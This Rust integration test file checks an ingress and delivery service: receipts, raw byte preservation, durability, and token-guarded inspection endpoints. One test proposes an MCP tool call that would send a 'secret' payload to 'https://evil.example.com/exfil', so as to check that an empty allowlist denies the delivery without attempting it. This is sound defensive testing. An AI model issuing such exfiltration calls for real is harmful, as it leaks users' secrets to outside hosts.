//! Journey A: POST /ingress -> Receipt -> deterministic Capability -> Delivery -> HTTP result.

mod common;
use serde_json::json;

#[tokio::test]
async fn ingress_call_completes_through_the_outbox() {
    let h = common::start("round-trip", &[]).await;

    let res: serde_json::Value = common::client()
        .post(format!("{}/ingress", h.base))
        .json(&json!({ "claim": "Mars owes me five euros" }))
        .send().await.unwrap()
        .json().await.unwrap();

    assert_eq!(res["status"], "completed");
    assert_eq!(res["result"]["capability"], "echo");

    // The receipt asserts arrival, never truth. The payload is preserved
    // verbatim, and nothing in the record endorses its content.
    assert_eq!(res["result"]["payload"]["claim"], "Mars owes me five euros");

    let receipt_id = res["receipt_id"].as_str().unwrap().to_string();
    let one: serde_json::Value = common::client()
        .get(format!("{}/receipts/{receipt_id}", h.base))
        .send().await.unwrap().json().await.unwrap();
    assert_eq!(one["receipt"]["status"], "routed");
    assert_eq!(one["receipt"]["interaction"], "call");
    assert_eq!(one["runs"][0]["status"], "completed");
}

#[tokio::test]
async fn raw_material_stays_byte_identical() {
    let h = common::start("raw", &[]).await;
    let body = r#"{"weird":"éàç \\ ' \" bytes"}"#;

    let res: serde_json::Value = common::client()
        .post(format!("{}/ingress", h.base))
        .header("content-type", "application/json")
        .body(body.to_string())
        .send().await.unwrap().json().await.unwrap();

    let id = res["receipt_id"].as_str().unwrap();
    let raw = common::client()
        .get(format!("{}/receipts/{id}/raw", h.base))
        .send().await.unwrap().text().await.unwrap();

    assert_eq!(raw, body, "raw received material must remain inspectable, unchanged");
    assert_eq!(res["digest"], blake3::hash(body.as_bytes()).to_hex().to_string());
}

#[tokio::test]
async fn fire_and_forget_is_durable_before_it_is_acknowledged() {
    let h = common::start("event", &[]).await;

    let res: serde_json::Value = common::client()
        .post(format!("{}/ingress?wait=0", h.base))
        .json(&json!({ "signal": "no answer wanted" }))
        .send().await.unwrap().json().await.unwrap();

    assert_eq!(res["status"], "accepted");
    // The receipt exists the instant acceptance is acknowledged, not later.
    let id = res["receipt_id"].as_str().unwrap();
    let one: serde_json::Value = common::client()
        .get(format!("{}/receipts/{id}", h.base))
        .send().await.unwrap().json().await.unwrap();
    assert_eq!(one["receipt"]["id"], id);
}

#[tokio::test]
async fn a_denied_delivery_is_never_attempted() {
    // Empty allowlist: no external destination is permitted at all.
    let h = common::start("authority", &[]).await;

    let res: serde_json::Value = common::client()
        .post(format!("{}/mcp", h.base))
        .json(&json!({
            "jsonrpc": "2.0", "id": 1, "method": "tools/call",
            "params": { "name": "create_delivery", "arguments": {
                "destination": "https://evil.example.com/exfil",
                "payload": { "secret": "x" }
            }}
        }))
        .send().await.unwrap().json().await.unwrap();
    assert_eq!(res["result"]["isError"], false, "the proposal itself is legitimate");

    tokio::time::sleep(std::time::Duration::from_millis(800)).await;

    let list: serde_json::Value = common::client()
        .get(format!("{}/deliveries?limit=50", h.base))
        .send().await.unwrap().json().await.unwrap();

    let denied = list["deliveries"].as_array().unwrap().iter()
        .find(|d| d["destination"] == "https://evil.example.com/exfil")
        .expect("the proposed delivery must be recorded, not silently dropped");

    assert_eq!(denied["status"], "denied");
    // The whole point: recorded, refused, and never tried even once.
    assert_eq!(denied["attempt"], 0);
}

#[tokio::test]
async fn the_inspection_surface_is_closed_when_a_token_is_set() {
    let dir = common::temp_dir("guard");
    let mut cfg = common::config_for(&dir, &[]);
    cfg.server.inspect_token = Some("s3cret-token".into());

    let app = antenna::build(cfg, &common::routes_path()).unwrap();
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let router = antenna::http_router(app);
    tokio::spawn(async move {
        axum::serve(listener, router.into_make_service_with_connect_info::<std::net::SocketAddr>())
            .await.unwrap();
    });
    let base = format!("http://{addr}");
    let c = common::client();

    // Receiving stays open. A membrane that refuses to receive is not one.
    let posted: serde_json::Value = c.post(format!("{base}/ingress"))
        .json(&json!({ "private": "payload" }))
        .send().await.unwrap().json().await.unwrap();
    let id = posted["receipt_id"].as_str().unwrap().to_string();

    // Replaying what was received does not.
    for path in [format!("/receipts"), format!("/receipts/{id}"),
                 format!("/receipts/{id}/raw"), format!("/deliveries")] {
        let res = c.get(format!("{base}{path}")).send().await.unwrap();
        assert_eq!(res.status(), 401, "{path} must not be public");
        let body = res.text().await.unwrap();
        assert!(!body.contains("private"), "{path} leaked payload content in its refusal");
    }

    // A wrong token is no better than none.
    let res = c.get(format!("{base}/receipts"))
        .header("authorization", "Bearer wrong").send().await.unwrap();
    assert_eq!(res.status(), 401);

    // The right one opens it.
    let res = c.get(format!("{base}/receipts"))
        .header("authorization", "Bearer s3cret-token").send().await.unwrap();
    assert_eq!(res.status(), 200);

    // /health stays public: liveness is not a secret.
    assert_eq!(c.get(format!("{base}/health")).send().await.unwrap().status(), 200);
}
